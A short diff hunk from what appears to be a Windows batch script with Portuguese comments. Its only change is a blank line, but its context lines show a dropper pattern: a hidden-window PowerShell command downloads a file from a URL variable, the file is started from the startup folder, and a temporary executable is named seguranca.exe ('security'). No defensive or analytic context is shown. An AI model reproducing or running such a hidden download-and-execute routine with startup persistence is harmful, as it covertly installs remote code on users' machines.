@@ -17,6 +17,7 @@ powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile
 :: Executa o arquivo
 start "" "%STARTUP%"
 
+
 setlocal
 
 set "TEMP_EXE=%TEMP%\seguranca.exe"
